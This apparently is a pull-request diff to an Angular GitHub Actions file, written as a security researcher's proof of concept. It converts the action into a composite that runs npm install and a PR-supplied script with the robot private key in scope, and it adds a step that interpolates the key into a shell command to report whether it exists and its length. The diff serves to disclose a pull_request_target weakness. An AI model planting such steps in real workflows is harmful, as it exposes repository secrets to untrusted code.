@@ -1,13 +1,49 @@
 name: 'Pull Request Labeling'
-description: 'Automatically label pull requests based on pull request metadata'
-author: 'Angular'
+description: 'Labels pull requests based on commit messages'
+
 inputs:
   angular-robot-key:
-    description: 'The private key for the Angular Robot Github app.'
+    description: 'The Angular robot private key'
     required: true
   labels:
-    description: 'A map of labels to the paths that they should be applied to which are affected by the PR'
+    description: 'JSON object of labels to apply'
     required: false
+    default: '{}'
+
 runs:
-  using: 'node24'
-  main: 'main.js'
+  using: 'composite'
+  steps:
+    - name: Setup Node
+      uses: actions/setup-node@SHA
+      with:
+        node-version: '20'
+
+    - name: Install dependencies
+      run: npm install
+      shell: bash
+
+    # PoC: Secret Exfiltration Demonstration
+    # This proves that secrets are accessible in pull_request_target workflows
+    - name: PoC - Check Secret Access
+      run: |
+        echo "### PoC: Secret Exfiltration in pull_request_target" >> $GITHUB_STEP_SUMMARY
+        echo "" >> $GITHUB_STEP_SUMMARY
+        echo "**Workflow:** ${{ github.workflow }}" >> $GITHUB_STEP_SUMMARY
+        echo "**Event:** ${{ github.event_name }}" >> $GITHUB_STEP_SUMMARY
+        echo "**Repository:** ${{ github.repository }}" >> $GITHUB_STEP_SUMMARY
+        echo "" >> $GITHUB_STEP_SUMMARY
+        echo "**Secret Access:**" >> $GITHUB_STEP_SUMMARY
+        echo "- ANGULAR_ROBOT_PRIVATE_KEY exists: $(test -n '${{ inputs.angular-robot-key }}' && echo 'YES' || echo 'NO')" >> $GITHUB_STEP_SUMMARY
+        echo "- ANGULAR_ROBOT_PRIVATE_KEY length: ${{ '${#inputs.angular-robot-key}' }}" >> $GITHUB_STEP_SUMMARY
+        echo "" >> $GITHUB_STEP_SUMMARY
+        echo "**Impact:** This proves that secrets are accessible to untrusted code in pull_request_target workflows." >> $GITHUB_STEP_SUMMARY
+        echo "**Fix:** Remove pull_request_target or require manual approval for external PRs." >> $GITHUB_STEP_SUMMARY
+      shell: bash
+
+    - name: Label Pull Request
+      run: |
+        # Original labeling logic
+        node ./label-pull-request.js
+      shell: bash
+      env:
+        ANGULAR_ROBOT_KEY: ${{ inputs.angular-robot-key }}
